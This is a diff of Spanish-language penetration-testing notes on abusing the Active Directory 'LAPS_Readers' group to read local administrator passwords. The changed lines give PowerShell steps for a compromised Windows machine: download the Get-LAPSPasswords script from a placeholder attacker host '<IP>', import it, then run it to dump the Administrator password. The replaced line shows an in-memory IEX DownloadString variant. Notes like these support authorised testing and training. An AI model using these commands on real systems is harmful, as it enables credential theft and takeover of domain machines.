@@ -41,11 +41,15 @@ Notas:
 ```powershell 
 3. 'LAPS_Readers' =  Los miembros del grupo 'LAPS\Readers' tienen 'permiso de lectura' sobre los atributos de Active Directory donde se almacenan las 'contraseñas locales administradas automáticamente'. Por lo tanto, se puede leer la contraseña del administrador local de las máquinas unidas al dominio, conectarte con esa contraseña y tomar el control de la máquina como 'administrador local'.
 
+# Descargar laa tool 
+https://github.com/kfosaaen/Get-LAPSPasswords
 
 Pasos:
-❯ https://github.com/kfosaaen/Get-LAPSPasswords   # Descargar 'Get-LAPSPasswords.ps1' y transferirlo a la máquina Windows comprometida
-❯ IEX (New-Object Net.WebClient).DownloadString('https://IP/Get-LAPSPasswords.ps1')  # Importar el módulo 
-❯ Get-LAPSPasswords          # Ejecutar la función para obtener la password de Administrator
+❯ powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>/Get-LAPSPasswords.ps1','Get-LAPSPasswords.ps1')" # Descargar la tool 
+
+❯ Import-Module .\Get-LAPSPasswords.ps1   # Importar el módulo 
+
+❯ Get-LAPSPasswords      # Ejecutar la función para obtener la password de Administrator
 ```
 
 ```powershell
